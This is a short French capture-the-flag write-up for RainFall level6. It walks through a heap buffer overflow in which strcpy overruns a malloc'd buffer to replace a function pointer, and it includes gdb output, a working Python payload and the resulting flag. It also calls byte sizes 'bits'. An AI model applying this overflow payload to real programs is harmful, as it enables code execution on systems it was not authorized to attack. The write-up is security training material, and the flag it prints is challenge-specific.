Ici on a un programme qui appelle deux fois `malloc` pour allouer de la memoire.
Une fois avec 64 bits et une fois avec 4 bits.
Ensuite plus loin on a un `strcpy` qui copie `argv[1]` dans le buffer de 64 bits.
On peut donc faire un buffer overflow en passant un argument de plus de 64 bits.
On a pour objectif d'executer la fonction `n` au lieu de la fonction `m`.

Avec gdb je vois lors du `strcpy`:
```bash
(gdb) x/a $esp+0x1c                    ; adresse du pointeur du premier malloc
0xbffff6dc:     0x804a008
(gdb) x/a $esp+0x18                    ; adresse du pointeur du deuxieme malloc
0xbffff6d8:     0x804a050
```
Lorsqu'on fait la soustraction des deux adresses on obtient 0x48 soit 72 en decimal.

On peut donc faire notre exploit:
1. [72] On mets des characteres pour remplir le buffer
2. [72 + 4] On ecrase l'adresse de `m` par l'adresse de `n`

L'addresse de `n` est `0x8048454` soit `\x54\x84\x04\x08` en little endian.

```bash
level6@RainFall:~$ ./level6 $(python -c "print 'A'*72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```